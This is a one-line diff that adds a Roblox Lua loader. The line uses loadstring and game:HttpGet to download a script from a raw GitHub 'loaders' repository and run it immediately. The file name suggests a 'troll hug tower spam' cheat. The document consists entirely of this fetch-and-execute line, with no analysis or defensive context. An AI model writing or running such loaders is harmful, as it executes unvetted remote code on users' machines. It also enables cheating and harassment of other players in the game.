@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/troll-hug-tower-spam6-45ra3q9fmfl7xh.lua"))()
